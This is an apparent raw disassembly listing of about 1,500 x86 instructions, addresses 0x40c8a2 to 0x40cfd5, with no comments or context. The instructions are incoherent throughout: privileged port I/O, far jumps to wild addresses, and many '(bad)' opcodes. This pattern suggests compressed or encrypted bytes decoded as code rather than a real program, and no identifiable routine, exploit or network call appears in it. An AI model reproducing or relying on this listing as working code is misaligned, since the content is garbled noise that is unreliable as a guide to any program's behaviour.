  40c8a2:	inc    edx
  40c8a3:	xor    eax,DWORD PTR [esi+0x3d5d2e70]
  40c8a9:	inc    eax
  40c8aa:	jmp    0xac0c7c83
  40c8af:	sti    
  40c8b0:	sti    
  40c8b1:	lahf   
  40c8b2:	out    0xf7,eax
  40c8b4:	fdiv   st(6),st
  40c8b6:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8b8:	xor    al,0xcf
  40c8ba:	pop    ds
  40c8bb:	lahf   
  40c8bc:	cmp    DWORD PTR [ebp+0xf4816fa],eax
  40c8c2:	iret   
  40c8c3:	js     0x40c921
  40c8c5:	push   ecx
  40c8c6:	jmp    0xbd42:0x29e76a7d
  40c8cd:	pop    esp
  40c8ce:	mov    dh,0xd2
  40c8d0:	sbb    BYTE PTR [ebx+0x71],dh
  40c8d3:	adc    BYTE PTR [ecx-0x8],cl
  40c8d6:	sub    DWORD PTR [ecx+0x201c57cb],edi
  40c8dc:	push   esi
  40c8dd:	imul   ebx,DWORD PTR ds:0xf909cd5a,0x33
  40c8e4:	fwait
  40c8e5:	aam    0x50
  40c8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e8:	lods   eax,DWORD PTR ds:[esi]
  40c8e9:	sti    
  40c8ea:	outs   dx,BYTE PTR ds:[esi]
  40c8eb:	mov    ch,0xbb
  40c8ed:	stos   DWORD PTR es:[edi],eax
  40c8ee:	mov    bh,BYTE PTR [edx+0x5e]
  40c8f1:	xchg   ebx,eax
  40c8f2:	jl     0x40c8a9
  40c8f4:	ss or  eax,esp
  40c8f7:	cli    
  40c8f8:	push   edi
  40c8f9:	jbe    0x40c90b
  40c8fb:	xchg   ecx,eax
  40c8fc:	push   edi
  40c8fd:	sub    BYTE PTR [ecx+0x6cce164f],ah
  40c903:	int3   
  40c904:	jge    0x40c8e1
  40c906:	mov    esp,0x2aff8683
  40c90b:	fwait
  40c90c:	mov    edx,0x782a946d
  40c911:	and    DWORD PTR [ecx],0xdc5612f1
  40c917:	imul   ebx,ebx,0xbca23708
  40c91d:	icebp  
  40c91e:	test   BYTE PTR [esp+edi*2+0x36],dl
  40c922:	pop    ds
  40c923:	out    0xb6,al
  40c925:	outs   dx,BYTE PTR ds:[esi]
  40c926:	mov    ebx,0xaf21d14d
  40c92b:	jbe    0x40c98e
  40c92d:	sub    eax,DWORD PTR [ebx]
  40c92f:	adc    cl,BYTE PTR [edx]
  40c931:	call   0x14e7ca2
  40c936:	inc    esi
  40c937:	jge    0x40c930
  40c939:	add    BYTE PTR [eax+0x29f85d95],0xc0
  40c940:	xchg   edi,eax
  40c941:	or     eax,0xfb873829
  40c946:	push   ds
  40c947:	push   ds
  40c948:	cdq    
  40c949:	cmp    BYTE PTR [ebp-0x6cf2402a],cl
  40c94f:	test   eax,0x6721ac24
  40c954:	int3   
  40c955:	movd   DWORD PTR [eax],mm2
  40c958:	push   edi
  40c959:	mov    ebx,0x49b586ec
  40c95e:	sub    eax,0xdf12dc3c
  40c963:	push   ss
  40c964:	pop    DWORD PTR [ecx-0x37791754]
  40c96a:	test   al,0x82
  40c96c:	mov    al,ds:0x9ad032a1
  40c971:	sbb    edi,DWORD PTR [ecx]
  40c973:	jb     0x40c909
  40c975:	sti    
  40c976:	pop    ss
  40c977:	aad    0x10
  40c979:	aaa    
  40c97a:	adc    BYTE PTR [ebx+edx*4+0x2eee8813],bl
  40c981:	aam    0x6e
  40c983:	mov    esp,0x6dbe5c38
  40c988:	aaa    
  40c989:	retf   0x16f2
  40c98c:	es dec esi
  40c98e:	jne    0x40c9f6
  40c990:	mov    BYTE PTR [edx],0x56
  40c993:	pop    ebx
  40c994:	iret   
  40c995:	daa    
  40c996:	loop   0x40ca09
  40c998:	imul   ebx,DWORD PTR [edx],0x19
  40c99b:	lds    edi,FWORD PTR [edi-0x66]
  40c99e:	xchg   DWORD PTR ds:0xe713b298,ebp
  40c9a4:	dec    DWORD PTR [esi-0x46]
  40c9a7:	inc    BYTE PTR [edi+0x60]
  40c9aa:	test   eax,0xec29376c
  40c9af:	mov    al,0xff
  40c9b1:	or     dl,bl
  40c9b3:	repz xchg dl,cl
  40c9b6:	sbb    eax,0x9b277437
  40c9bb:	xchg   ebx,eax
  40c9bc:	in     eax,0x9b
  40c9be:	xor    bh,BYTE PTR [esi]
  40c9c0:	sbb    ch,BYTE PTR [ebx+0x60dd15c4]
  40c9c6:	push   ecx
  40c9c7:	outs   dx,DWORD PTR ds:[esi]
  40c9c8:	pop    es
  40c9c9:	out    dx,al
  40c9ca:	imul   eax,DWORD PTR [ecx+0xe],0x5e023d73
  40c9d1:	jle    0x40ca49
  40c9d3:	and    eax,0x94a2f1c0
  40c9d8:	div    al
  40c9da:	jne    0x40c9f1
  40c9dc:	cs jae 0x40c995
  40c9df:	loopne 0x40ca43
  40c9e1:	adc    esp,ebx
  40c9e3:	mov    cl,0x33
  40c9e5:	outs   dx,DWORD PTR ds:[esi]
  40c9e6:	jae    0x40c9ce
  40c9e8:	pop    esi
  40c9e9:	adc    eax,0xce35620c
  40c9ee:	inc    eax
  40c9ef:	or     DWORD PTR [edi-0x306d6615],ebx
  40c9f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9f6:	adc    DWORD PTR [eax],0xfffffff4
  40c9f9:	inc    eax
  40c9fa:	mov    edi,0x3e8577fc
  40c9ff:	mov    ds:0xf3c59f90,al
  40ca04:	jns    0x40ca2f
  40ca06:	pop    edi
  40ca07:	mov    bl,0x75
  40ca09:	test   al,0x62
  40ca0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca0c:	xchg   BYTE PTR [ebx],bh
  40ca0e:	adc    DWORD PTR [ecx],edi
  40ca10:	adc    esi,DWORD PTR [esi+0x512c180d]
  40ca16:	imul   eax,DWORD PTR [edi+0x5ba2f8cb],0xffffffcc
  40ca1d:	iret   
  40ca1e:	push   ebx
  40ca1f:	scas   al,BYTE PTR es:[edi]
  40ca20:	and    bh,BYTE PTR [edx-0x6f]
  40ca23:	in     eax,0xb4
  40ca25:	mov    ah,0xf6
  40ca27:	xchg   esi,edx
  40ca29:	in     eax,dx
  40ca2a:	imul   ebx,DWORD PTR [ebx+0x2b79c402],0x4d3f6672
  40ca34:	popa   
  40ca35:	inc    edx
  40ca36:	(bad)  
  40ca37:	pop    ecx
  40ca38:	loopne 0x40ca12
  40ca3a:	mov    DWORD PTR [esi+0x6f2a3723],edi
  40ca40:	sub    BYTE PTR [ecx+0xa],dl
  40ca43:	mov    al,0x8e
  40ca45:	bound  ebx,QWORD PTR [edi]
  40ca47:	cmp    bh,dh
  40ca49:	inc    esi
  40ca4a:	sbb    ebx,eax
  40ca4c:	sub    bh,BYTE PTR [eax+eax*2+0x64]
  40ca50:	mov    esi,0x6faef61c
  40ca55:	retf   0x720a
  40ca58:	push   0x53458d81
  40ca5d:	addr16 ror eax,1
  40ca60:	pop    ebx
  40ca61:	xchg   ebp,eax
  40ca62:	mov    ds:0xf684c45f,al
  40ca67:	in     eax,dx
  40ca68:	iret   
  40ca69:	jns    0x40ca7e
  40ca6b:	inc    edi
  40ca6c:	in     al,0x64
  40ca6e:	xor    al,0x64
  40ca70:	test   eax,0x81049225
  40ca75:	mov    ds:0xdf3d1e31,eax
  40ca7a:	mul    al
  40ca7c:	mov    BYTE PTR [ebx-0x40],al
  40ca7f:	out    dx,eax
  40ca80:	lods   al,BYTE PTR ds:[esi]
  40ca81:	lods   eax,DWORD PTR ds:[esi]
  40ca82:	aam    0xaf
  40ca84:	cmc    
  40ca85:	or     DWORD PTR [ebp+esi*8-0xb6a8c78],ebx
  40ca8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8d:	or     al,0xf0
  40ca8f:	mov    ebp,0x460c28d0
  40ca94:	in     eax,dx
  40ca95:	dec    edx
  40ca96:	retf   0xed64
  40ca99:	adc    eax,0xfefac8f2
  40ca9e:	fwait
  40ca9f:	es hlt 
  40caa1:	sub    al,0x83
  40caa3:	push   esi
  40caa4:	push   esi
  40caa5:	outs   dx,DWORD PTR ds:[esi]
  40caa6:	packsswb mm1,QWORD PTR [edx-0x7fadda19]
  40caad:	or     eax,0x2bc013da
  40cab2:	add    BYTE PTR [eax-0x58682d04],bl
  40cab8:	das    
  40cab9:	in     eax,0x40
  40cabb:	xor    edi,DWORD PTR [esi+0x328e06f5]
  40cac1:	rcl    BYTE PTR [ebp+0x4202f1a],1
  40cac7:	daa    
  40cac8:	andnps xmm2,XMMWORD PTR [ebp-0x3766d3db]
  40cacf:	in     al,0x3e
  40cad1:	and    edi,ebp
  40cad3:	jns    0x40cb05
  40cad5:	(bad)  [ebp-0x2c]
  40cad8:	ds cs xchg ebx,eax
  40cadb:	ret    0xf4df
  40cade:	jo     0x40ca79
  40cae0:	push   0xffffffaf
  40cae2:	jge    0x40ca90
  40cae4:	or     esp,DWORD PTR [di-0x386e]
  40cae9:	xor    al,0x33
  40caeb:	add    esi,ebx
  40caed:	retf   0x905e
  40caf0:	or     BYTE PTR [edx+0x6f],ah
  40caf3:	jmp    0x40cb3b
  40caf5:	xor    dl,BYTE PTR [esi-0x6b96754e]
  40cafb:	xor    BYTE PTR [edi*1+0x751fa443],ah
  40cb02:	xchg   edx,eax
  40cb03:	sbb    al,0x2d
  40cb05:	add    eax,0x70a13078
  40cb0a:	lahf   
  40cb0b:	inc    edi
  40cb0c:	daa    
  40cb0d:	xchg   edx,eax
  40cb0e:	jl     0x40cafc
  40cb10:	lods   al,BYTE PTR ds:[esi]
  40cb11:	aaa    
  40cb12:	sub    cl,ch
  40cb14:	jbe    0x40cacc
  40cb16:	aam    0xd8
  40cb18:	inc    esi
  40cb19:	sub    dl,BYTE PTR [esp+edi*4]
  40cb1c:	imul   ecx,DWORD PTR [edx+eiz*8-0x30],0x181ae77e
  40cb24:	jns    0x40cb9c
  40cb26:	cmp    eax,0x7967a682
  40cb2b:	and    ch,al
  40cb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb2e:	inc    edx
  40cb2f:	cdq    
  40cb30:	sub    esi,DWORD PTR [ebx]
  40cb32:	jno    0x40cb79
  40cb34:	mov    al,ds:0x93ffeeb7
  40cb39:	adc    bh,bl
  40cb3b:	sti    
  40cb3c:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x3352ff84]
  40cb43:	shl    BYTE PTR [ebx-0x5e],1
  40cb46:	dec    DWORD PTR [eax+0x6f]
  40cb49:	inc    ecx
  40cb4a:	lods   eax,DWORD PTR ds:[esi]
  40cb4b:	jle    0x40cb04
  40cb4d:	into   
  40cb4e:	push   edi
  40cb4f:	fwait
  40cb50:	call   0x9428:0x9cc65184
  40cb57:	add    al,dl
  40cb59:	test   BYTE PTR [ebx+0x3e469339],bl
  40cb5f:	dec    edx
  40cb60:	popa   
  40cb61:	out    0xd3,al
  40cb63:	aam    0xa1
  40cb65:	scas   al,BYTE PTR es:[edi]
  40cb66:	sub    BYTE PTR [edi+0x3aa8cef9],0x6e
  40cb6d:	nop
  40cb6e:	add    eax,0xd4c9c868
  40cb73:	push   ebx
  40cb74:	fstp   QWORD PTR fs:[ebx+ecx*2-0x47]
  40cb79:	jmp    0x6942aa46
  40cb7e:	shl    DWORD PTR [esi+0x3a],0x6f
  40cb82:	popf   
  40cb83:	ds (bad) 
  40cb85:	jg     0x40cb16
  40cb87:	jb     0x40cbff
  40cb89:	push   ds
  40cb8a:	jp     0x40cb4a
  40cb8c:	xchg   ebx,eax
  40cb8d:	push   ebx
  40cb8e:	(bad)  
  40cb8f:	cmp    DWORD PTR [edi],ebx
  40cb91:	and    ecx,edx
  40cb93:	jmp    0x40cb2f
  40cb95:	fld    QWORD PTR [edx+ebx*8]
  40cb98:	mov    bl,bl
  40cb9a:	mov    ss,ecx
  40cb9c:	jmp    0x8edb4ba8
  40cba1:	loope  0x40cba3
  40cba3:	leave  
  40cba4:	popa   
  40cba5:	je     0x40cbae
  40cba7:	retf   
  40cba8:	sar    esi,1
  40cbaa:	adc    esp,ecx
  40cbac:	call   0xea24fa77
  40cbb1:	imul   ebp,DWORD PTR [ebx-0x19],0x6f144f67
  40cbb8:	addr16 jmp 0x40cb82
  40cbbb:	repz or DWORD PTR [eax],esi
  40cbbe:	leave  
  40cbbf:	pop    ebp
  40cbc0:	push   edx
  40cbc1:	dec    ebx
  40cbc2:	push   ebx
  40cbc3:	push   esi
  40cbc4:	xchg   esp,eax
  40cbc5:	pusha  
  40cbc6:	call   0x30d62ae4
  40cbcb:	iret   
  40cbcc:	push   ebp
  40cbcd:	push   ecx
  40cbce:	pop    edx
  40cbcf:	push   es
  40cbd0:	sbb    eax,0xaa902abd
  40cbd5:	or     al,0x11
  40cbd7:	hlt    
  40cbd8:	adc    al,bh
  40cbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbdb:	push   ds
  40cbdc:	imul   edi,esi,0x48
  40cbdf:	sbb    bh,BYTE PTR [ebx+0x7f]
  40cbe2:	cmp    eax,DWORD PTR [esi+0x18]
  40cbe5:	pop    ecx
  40cbe6:	cmp    BYTE PTR [ebx+0x2],dh
  40cbe9:	dec    edi
  40cbea:	je     0x40cbdf
  40cbec:	inc    ecx
  40cbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbee:	nop
  40cbef:	(bad)  
  40cbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf1:	sbb    ebp,DWORD PTR [ecx+0x132adca6]
  40cbf7:	dec    ebp
  40cbf8:	popf   
  40cbf9:	dec    ebx
  40cbfa:	xor    al,0x9f
  40cbfc:	pop    es
  40cbfd:	sbb    eax,0xaed128b3
  40cc02:	inc    dh
  40cc04:	pop    ebp
  40cc05:	mov    ch,0xf
  40cc07:	rcr    BYTE PTR [eiz*2-0x19ea57c3],cl
  40cc0e:	jne    0x40cb9d
  40cc10:	and    ecx,DWORD PTR [ecx]
  40cc12:	sbb    DWORD PTR [ebp-0x5a],0x58
  40cc16:	fs jg  0x40cb9b
  40cc19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc1a:	loope  0x40cc1e
  40cc1c:	jnp    0x40cc27
  40cc1e:	loopne 0x40cbaf
  40cc20:	jnp    0x40cc0c
  40cc22:	out    dx,al
  40cc23:	pop    esp
  40cc24:	mov    al,0x4f
  40cc26:	dec    edx
  40cc27:	sub    BYTE PTR [ecx-0x62],0xcb
  40cc2b:	int3   
  40cc2c:	dec    esp
  40cc2d:	fld    st(3)
  40cc2f:	inc    eax
  40cc30:	jecxz  0x40ccab
  40cc32:	retf   
  40cc33:	mov    ebp,gs
  40cc35:	jnp    0x40cbd4
  40cc37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc38:	or     bl,cl
  40cc3a:	repnz push 0x6e073221
  40cc40:	jg     0x40cbf1
  40cc42:	scas   eax,DWORD PTR es:[edi]
  40cc43:	jge    0x40cc05
  40cc45:	loop   0x40cc28
  40cc47:	push   eax
  40cc48:	scas   al,BYTE PTR es:[edi]
  40cc49:	pop    es
  40cc4a:	cs cmp esp,esp
  40cc4d:	retf   
  40cc4e:	push   0xc365193d
  40cc53:	lea    esi,[eax]
  40cc55:	mov    esi,0x6c6e91b9
  40cc5a:	je     0x40cc06
  40cc5c:	ins    DWORD PTR es:[edi],dx
  40cc5d:	cmp    ecx,DWORD PTR [ebp-0x2da3e116]
  40cc63:	cli    
  40cc64:	stc    
  40cc65:	or     eax,0xe3b6c32d
  40cc6a:	scas   eax,DWORD PTR es:[edi]
  40cc6b:	or     ecx,esi
  40cc6d:	adc    eax,0xba7c422
  40cc72:	mov    ecx,0xd5514218
  40cc77:	xor    ebp,esi
  40cc79:	cmp    esp,DWORD PTR [edi+0x436ba04b]
  40cc7f:	int    0xb8
  40cc81:	inc    esi
  40cc82:	jle    0x40cc0b
  40cc84:	jge    0x40cc0d
  40cc86:	mov    bh,BYTE PTR [ecx-0x7c]
  40cc89:	pop    ss
  40cc8a:	pop    ebp
  40cc8b:	rol    cl,cl
  40cc8d:	cmp    bl,BYTE PTR [edi-0x12]
  40cc90:	cmp    al,0x91
  40cc92:	pop    ebp
  40cc93:	stos   BYTE PTR es:[edi],al
  40cc94:	ret    0xf5af
  40cc97:	test   al,0xe0
  40cc99:	ja     0x40ccae
  40cc9b:	icebp  
  40cc9c:	jp     0x40cc5c
  40cc9e:	lock cs inc esi
  40cca1:	test   DWORD PTR [esp+edi*4+0x4b],ebx
  40cca5:	cmp    ebx,DWORD PTR [esi]
  40cca7:	(bad)  
  40cca8:	rcl    BYTE PTR [esi],cl
  40ccaa:	dec    eax
  40ccab:	jmp    0x40cc63
  40ccad:	sub    ebx,DWORD PTR [edx]
  40ccaf:	inc    ebx
  40ccb0:	jo     0x40ccb3
  40ccb2:	leave  
  40ccb3:	and    bl,BYTE PTR [ebp-0x53]
  40ccb6:	scas   eax,DWORD PTR es:[edi]
  40ccb7:	ret    
  40ccb8:	neg    ebx
  40ccba:	mov    ss,ebx
  40ccbc:	cmp    ax,0xdb14
  40ccc0:	xchg   ebx,eax
  40ccc1:	idiv   BYTE PTR ds:0x6beb0460
  40ccc7:	pushf  
  40ccc8:	add    al,0xbf
  40ccca:	cmp    DWORD PTR [ebx-0xb],edx
  40cccd:	addr16 or eax,0xc05e5737
  40ccd3:	dec    ebx
  40ccd4:	cmp    eax,0x23f33aa0
  40ccd9:	mov    ebp,0x40663323
  40ccde:	cmp    al,0xba
  40cce0:	cmp    eax,0xbe2e8adb
  40cce5:	ret    0x798e
  40cce8:	add    al,0x56
  40ccea:	jns    0x40cc8b
  40ccec:	in     al,dx
  40cced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccee:	jp     0x40cd46
  40ccf0:	jl     0x40cc98
  40ccf2:	pop    es
  40ccf3:	imul   DWORD PTR [esi+0x7695984b]
  40ccf9:	dec    ecx
  40ccfa:	lock push edi
  40ccfc:	and    ch,bl
  40ccfe:	call   0x10f83fb1
  40cd03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd04:	xlat   BYTE PTR ds:[ebx]
  40cd05:	or     DWORD PTR [ebx+0x314427c9],0x4
  40cd0c:	xor    al,BYTE PTR [esi-0x33]
  40cd0f:	mov    edx,0x603663ba
  40cd14:	pop    ebp
  40cd15:	das    
  40cd16:	gs aaa 
  40cd18:	adc    BYTE PTR [edx+0x27],al
  40cd1b:	cmc    
  40cd1c:	pop    esi
  40cd1d:	pop    eax
  40cd1e:	cld    
  40cd1f:	repz sahf 
  40cd21:	xchg   ecx,eax
  40cd22:	inc    edx
  40cd23:	ss sub cl,ah
  40cd26:	push   ecx
  40cd27:	fsub   DWORD PTR [edi*8-0x14e5a027]
  40cd2e:	bound  esi,QWORD PTR [edx]
  40cd30:	jae    0x40cd75
  40cd32:	mov    es,WORD PTR [ecx]
  40cd34:	fnstenv [ebx-0x10]
  40cd37:	into   
  40cd38:	loope  0x40cdad
  40cd3a:	mov    ds:0xb03c71eb,eax
  40cd3f:	and    dh,BYTE PTR [eax+0x60]
  40cd42:	sbb    DWORD PTR [ebp-0x2ee684bf],eax
  40cd48:	popa   
  40cd49:	rcl    BYTE PTR [esi-0x6a],0xc3
  40cd4d:	addr16 aad 0x6
  40cd50:	push   ebx
  40cd51:	sub    al,0xc5
  40cd53:	data16 fbld TBYTE PTR [eax-0x3d9ec25]
  40cd5a:	add    edi,edi
  40cd5c:	jns    0x40cd89
  40cd5e:	iret   
  40cd5f:	pop    esi
  40cd60:	push   edi
  40cd61:	retf   
  40cd62:	pop    ecx
  40cd63:	mov    ebp,0xca51ac2f
  40cd68:	mov    ch,0x58
  40cd6a:	mov    ebx,0x73b8c975
  40cd6f:	icebp  
  40cd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd71:	fwait
  40cd72:	push   eax
  40cd73:	and    BYTE PTR ds:0xf216c726,0xe1
  40cd7a:	and    DWORD PTR [ebx],ebp
  40cd7c:	mov    dl,0x8d
  40cd7e:	mov    ds:0xfe4b9754,eax
  40cd83:	das    
  40cd84:	push   ecx
  40cd85:	das    
  40cd86:	pop    esp
  40cd87:	cmp    BYTE PTR [edx],0x40
  40cd8a:	jg     0x40cd79
  40cd8c:	inc    edx
  40cd8d:	ret    
  40cd8e:	fs inc esp
  40cd90:	jae    0x40cde1
  40cd92:	div    ch
  40cd94:	inc    eax
  40cd95:	test   BYTE PTR [ecx],0x76
  40cd98:	mov    eax,ds:0x23d07dcb
  40cd9d:	jmp    0xf97622e8
  40cda2:	mov    BYTE PTR [eax-0x208937c],cl
  40cda8:	retf   
  40cda9:	scas   al,BYTE PTR es:[edi]
  40cdaa:	dec    esp
  40cdab:	mov    bh,0x99
  40cdad:	(bad)  
  40cdae:	jp     0x40ce24
  40cdb0:	pop    ecx
  40cdb1:	pop    es
  40cdb2:	xor    DWORD PTR [esi],esp
  40cdb4:	in     eax,dx
  40cdb5:	mov    ch,0x85
  40cdb7:	xor    DWORD PTR [ebx],edi
  40cdb9:	fidiv  DWORD PTR [esp+eiz*4+0x6d12e30]
  40cdc0:	lock std 
  40cdc2:	mov    dh,0xb2
  40cdc4:	or     al,0xb
  40cdc6:	xor    al,0xbc
  40cdc8:	jno    0x40cd6d
  40cdca:	lds    ecx,FWORD PTR [esp+ebp*4+0x61667f6a]
  40cdd1:	xchg   esp,eax
  40cdd2:	inc    edx
  40cdd3:	in     al,dx
  40cdd4:	xchg   esi,eax
  40cdd5:	xchg   ebp,eax
  40cdd6:	adc    DWORD PTR [edx-0x25],0x7c
  40cdda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cddb:	xchg   edi,eax
  40cddc:	xlat   BYTE PTR ds:[ebx]
  40cddd:	cld    
  40cdde:	push   ebp
  40cddf:	or     ebx,edx
  40cde1:	rcr    DWORD PTR [ecx-0x76],1
  40cde4:	stos   DWORD PTR es:[edi],eax
  40cde5:	pop    esi
  40cde6:	test   BYTE PTR [eax],ah
  40cde8:	mov    ds:0xab90c972,eax
  40cded:	xor    DWORD PTR [ebp-0x3],0xffffffb6
  40cdf1:	sub    ah,ah
  40cdf3:	and    bl,BYTE PTR [ebx-0x16]
  40cdf6:	int3   
  40cdf7:	jnp    0x40ce41
  40cdf9:	fadd   QWORD PTR [ebp+0x46]
  40cdfc:	xchg   ecx,eax
  40cdfd:	icebp  
  40cdfe:	lahf   
  40cdff:	repz sti 
  40ce01:	out    0xd4,al
  40ce03:	pop    esi
  40ce04:	retf   
  40ce05:	add    eax,0xaa1937ce
  40ce0a:	nop
  40ce0b:	sbb    eax,0x1c3abf4a
  40ce10:	cmp    al,0x13
  40ce12:	push   esp
  40ce13:	dec    edi
  40ce14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce15:	das    
  40ce16:	arpl   WORD PTR [eax-0x7aef6fc0],ax
  40ce1c:	es ja  0x40ce8f
  40ce1f:	mov    ebx,0xf4c5d89b
  40ce24:	les    edi,FWORD PTR [esi*4-0xd451c3]
  40ce2b:	cdq    
  40ce2c:	call   0x98141a97
  40ce31:	enter  0xbcbf,0xe2
  40ce35:	pop    esi
  40ce36:	xchg   edi,eax
  40ce37:	jmp    0x40cde5
  40ce39:	jae    0x40cdcb
  40ce3b:	ins    BYTE PTR es:[edi],dx
  40ce3c:	sub    eax,0x9734753d
  40ce41:	mov    cl,0x60
  40ce43:	push   0x5df0f115
  40ce48:	mov    edi,0x6057ee89
  40ce4d:	lea    edx,[ecx+0x1f]
  40ce50:	xor    DWORD PTR [edi],ebx
  40ce52:	cmp    BYTE PTR [eax+ecx*1],al
  40ce55:	xor    DWORD PTR [eax-0x70],ecx
  40ce58:	stos   DWORD PTR es:[edi],eax
  40ce59:	imul   ecx,DWORD PTR [esi-0x8],0x22
  40ce5d:	pushf  
  40ce5e:	mov    dl,0x4b
  40ce60:	hlt    
  40ce61:	pop    edx
  40ce62:	mul    DWORD PTR [esi]
  40ce64:	mov    ch,0xc9
  40ce66:	jg     0x40ce68
  40ce68:	jmp    0x224c:0x93e2ad0e
  40ce6f:	push   0xd9ea9fef
  40ce74:	gs and eax,0x617bb646
  40ce7a:	dec    esp
  40ce7b:	dec    ecx
  40ce7c:	add    al,BYTE PTR [edx-0x18]
  40ce7f:	ret    
  40ce80:	loope  0x40ce62
  40ce82:	stos   DWORD PTR es:[edi],eax
  40ce83:	scas   eax,DWORD PTR es:[di]
  40ce85:	scas   al,BYTE PTR es:[edi]
  40ce86:	mov    al,0xbf
  40ce88:	xchg   edi,eax
  40ce89:	dec    eax
  40ce8a:	jns    0x40cedd
  40ce8c:	pop    ss
  40ce8d:	add    eax,0x987fd18f
  40ce92:	jae    0x40ce31
  40ce94:	jne    0x40ce9d
  40ce96:	stc    
  40ce97:	sub    BYTE PTR [ebp+edi*4+0x20b964ec],bl
  40ce9e:	mov    edi,DWORD PTR [edi+0x5285d94b]
  40cea4:	mov    eax,ds:0xc3fc5a17
  40cea9:	add    dh,BYTE PTR [eax-0x33]
  40ceac:	inc    ebx
  40cead:	pop    ss
  40ceae:	pop    esi
  40ceaf:	xor    bh,BYTE PTR [eax-0x9e58922]
  40ceb5:	jmp    0x86a2:0x3587807
  40cebc:	retf   0x321e
  40cebf:	inc    esp
  40cec0:	adc    esp,DWORD PTR cs:[edi-0x8d47c32]
  40cec7:	adc    ebx,ebp
  40cec9:	std    
  40ceca:	and    BYTE PTR [eax+0x2a],0xad
  40cece:	mov    DWORD PTR [edx+0x59],esp
  40ced1:	mov    ebx,0xa5543e9
  40ced6:	test   al,0xbc
  40ced8:	or     al,0x10
  40ceda:	mov    esi,0x5ac71c32
  40cedf:	xor    DWORD PTR [esi],0x2b
  40cee2:	xor    eax,0xc2d6d7d2
  40cee7:	mul    BYTE PTR ds:0x7ae3e169
  40ceed:	xor    al,0xc
  40ceef:	xchg   BYTE PTR ds:0xb6056168,cl
  40cef5:	xor    eax,0xd495da
  40cefa:	call   0xdfe0b48d
  40ceff:	cmp    al,0xcc
  40cf01:	loop   0x40ceaf
  40cf03:	xlat   BYTE PTR ds:[ebx]
  40cf04:	inc    ebp
  40cf05:	push   0x79e442e4
  40cf0a:	jecxz  0x40cf86
  40cf0c:	ja     0x40cf3f
  40cf0e:	dec    edi
  40cf0f:	push   ebx
  40cf10:	dec    eax
  40cf11:	sub    DWORD PTR [edx],edx
  40cf13:	cmp    esi,0x96facea9
  40cf19:	in     al,dx
  40cf1a:	fpatan 
  40cf1c:	ret    
  40cf1d:	ret    0xbd1b
  40cf20:	cmp    ch,0xf5
  40cf23:	mov    dh,BYTE PTR [edi]
  40cf25:	mov    edx,0xba39df92
  40cf2a:	or     al,0x84
  40cf2c:	aas    
  40cf2d:	jo     0x40cfa2
  40cf2f:	push   edx
  40cf30:	out    dx,al
  40cf31:	push   ebp
  40cf32:	inc    esp
  40cf33:	dec    ebx
  40cf34:	pushf  
  40cf35:	push   cs
  40cf36:	mov    BYTE PTR [eax+0x2397d106],bh
  40cf3c:	ds push ss
  40cf3e:	add    BYTE PTR [esi+ebp*8-0x5ca22e62],0x96
  40cf46:	lods   eax,DWORD PTR ds:[esi]
  40cf47:	test   edx,esp
  40cf49:	mov    eax,ds:0x39ed1d0e
  40cf4e:	sub    al,0x96
  40cf50:	push   esp
  40cf51:	sbb    al,BYTE PTR [ecx]
  40cf53:	out    dx,al
  40cf54:	lods   al,BYTE PTR ds:[esi]
  40cf55:	cld    
  40cf56:	xor    eax,ebp
  40cf58:	in     al,0x10
  40cf5a:	loope  0x40cf4a
  40cf5c:	xchg   esp,esi
  40cf5e:	xchg   esp,eax
  40cf5f:	pop    es
  40cf60:	xor    BYTE PTR ds:0xf40f34fc,0x84
  40cf67:	inc    ebp
  40cf68:	sub    ebp,DWORD PTR [edx-0x3e61bdff]
  40cf6e:	mov    bh,0xa0
  40cf70:	loopne 0x40cf1a
  40cf72:	stc    
  40cf73:	loopne 0x40cf1f
  40cf75:	or     al,0x90
  40cf77:	sub    al,0xa5
  40cf79:	mov    ebx,0xda908fe7
  40cf7e:	xor    bl,dh
  40cf80:	mov    bh,0xc4
  40cf82:	dec    ebp
  40cf83:	(bad)  
  40cf84:	scas   eax,DWORD PTR es:[edi]
  40cf85:	xor    al,0x2c
  40cf87:	mov    dh,0x9f
  40cf89:	psubb  mm2,QWORD PTR [eax+ebp*2-0x44]
  40cf8e:	repnz pop esp
  40cf90:	mov    eax,0x20275e3f
  40cf95:	test   BYTE PTR [ebx+0x12],cl
  40cf98:	jbe    0x40cfb0
  40cf9a:	sbb    esi,esi
  40cf9c:	add    BYTE PTR [esi-0x72],dh
  40cf9f:	push   eax
  40cfa0:	or     ah,ch
  40cfa2:	(bad)  
  40cfa3:	in     eax,dx
  40cfa4:	ins    DWORD PTR es:[edi],dx
  40cfa5:	inc    esp
  40cfa6:	sub    esp,ebx
  40cfa8:	lahf   
  40cfa9:	inc    esi
  40cfaa:	stos   DWORD PTR es:[edi],eax
  40cfab:	fcmovnu st,st(1)
  40cfad:	sar    BYTE PTR [ebx+0x40],cl
  40cfb0:	fwait
  40cfb1:	mov    edx,0xc1e5498c
  40cfb6:	sub    al,0xc8
  40cfb9:	jno    0x40cf48
  40cfbb:	sbb    al,0x2b
  40cfbd:	mov    edi,ebx
  40cfbf:	stc    
  40cfc0:	pop    esi
  40cfc1:	add    eax,0x7bb7911a
  40cfc6:	icebp  
  40cfc7:	retf   0x3ba8
  40cfca:	sub    esi,DWORD PTR [esi-0x52]
  40cfcd:	(bad)  
  40cfce:	(bad)  
  40cfcf:	cmp    DWORD PTR [ecx+0x1a],ecx
  40cfd2:	(bad)  
  40cfd3:	in     al,0x99
  40cfd5:	ds dec ebx
